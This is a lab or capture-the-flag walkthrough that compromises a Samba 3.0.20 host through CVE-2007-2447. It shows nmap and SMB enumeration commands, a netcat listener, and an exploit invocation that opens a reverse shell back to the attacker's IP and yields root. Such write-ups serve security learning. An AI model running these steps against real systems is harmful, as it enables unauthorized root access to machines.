## Reconnaissance & Enumeration

### Initial Nmap Scan

Started with a basic nmap scan but the host appeared down:

```bash
nmap -sC -sV 10.129.66.104
```

Used `-Pn` flag to bypass ICMP checks:

```bash
nmap -Pn -sC -sV 10.129.66.104
```

**Open Ports:**
- **Port 21**: vsftpd 2.3.4 (FTP with anonymous login allowed)
- **Port 22**: OpenSSH 4.7p1 Debian 8ubuntu1
- **Port 139**: Samba smbd 3.X - 4.X
- **Port 445**: Samba smbd 3.0.20-Debian

**Key Findings:**
- Samba 3.0.20-Debian is an extremely old and vulnerable version (released 2006)
- Anonymous FTP login allowed but no useful files
- SMB is the primary attack vector

### FTP Enumeration

Attempted anonymous FTP login but found no useful files or exploitable content.

### SMB Protocol Analysis

Checked SMB protocols and security configuration:

```bash
nmap -Pn -p445 --script smb-protocols,smb-security-mode 10.129.66.104
```

**SMB Details:**
- Protocol: SMBv1 (NT LM 0.12) — extremely old and dangerous
- Authentication: Guest/Anonymous access
- Message signing: Disabled

### SMB Share Discovery

Listed available SMB shares:

```bash
smbclient -L //10.129.66.104 -N --option='client min protocol=NT1'
```

**Available Shares:**
- `print$` — Printer Drivers
- `tmp` — oh noes!
- `opt` — (access denied)
- `IPC$` — IPC Service
- `ADMIN$` — IPC Service

Explored the `tmp` share but found only log files with no exploitable content.

## Exploitation

### Vulnerability Assessment

Samba 3.0.20-Debian is vulnerable to **CVE-2007-2447** — a critical remote code execution vulnerability in the username map script functionality.

### Researching the CVE

Found public exploit on GitHub: [CVE-2007-2447 by amriunix](https://github.com/amriunix/CVE-2007-2447)

This vulnerability allows unauthenticated remote code execution through SMB by exploiting improper handling of user mapping scripts.

### Setting Up Reverse Shell Listener

Started netcat listener on attacker machine:

```bash
nc -lvnp 5555
```

### Executing the Exploit

Ran the Python exploit script with target details:

```bash
python usermap_script.py 10.129.66.104 139 10.10.14.60 5555
```

**Result:** Reverse shell connection established immediately.

### Verifying System Access

Checked privileges on the compromised system:

```bash
whoami
```

**Output:**

root


**Success!** Achieved root access directly — no privilege escalation needed.

## Summary & Key Takeaways

### Attack Chain

1. **Enumeration** → Identified Samba 3.0.20-Debian with SMBv1
2. **Vulnerability Research** → Found CVE-2007-2447 affecting this version
3. **Public Exploit** → Located and prepared Python exploit script
4. **Reverse Shell Setup** → Started netcat listener on port 5555
5. **Code Execution** → Exploited usermap script vulnerability via SMB
6. **Root Access** → Achieved immediate root-level shell
7. **Flag Retrieval** → Captured both user and root flags

### Key Vulnerabilities

- **Ancient Samba Version** — 3.0.20 released in 2006, unsupported for years
- **SMBv1 Protocol** — Deprecated and dangerous, should be disabled everywhere
- **Usermap Script Exploitation** — Allows arbitrary command execution
- **No Authentication Required** — Vulnerability exploitable anonymously
- **Root Execution** — Samba process runs with root privileges

### Critical Details

- **CVE-2007-2447** was a critical vulnerability that earned significant attention in the security community
- The vulnerability exists in the username map script option (`username map script`) which can be exploited to execute arbitrary commands
- Samba 3.0.20 processes requests with root privileges, making this a direct path to full system compromise
- The exploit works through SMB port 139 or 445 without requiring credentials

### Tools Used

- `nmap` — port scanning and service enumeration with script scanning
- `smbclient` — SMB share enumeration and exploration
- `python usermap_script.py` — CVE-2007-2447 exploit script
- `nc (netcat)` — reverse shell listener
- Standard Linux commands for flag retrieval

### Lessons Learned

- **Always use `-Pn`** — Hosts may not respond to ping but still have open ports
- **Enum all SMB versions** — SMBv1 is extremely dangerous and should be disabled
- **Legacy services are critical risks** — Samba 3.0.20 is over 20 years old
- **Check CVE databases** — Older software versions often have known exploits
- **Public exploits are valuable** — GitHub repositories often contain working exploit code
- **Samba misconfigurations** — The username map script feature is dangerous if enabled
- **Root execution contexts** — Services running as root multiply the impact of vulnerabilities
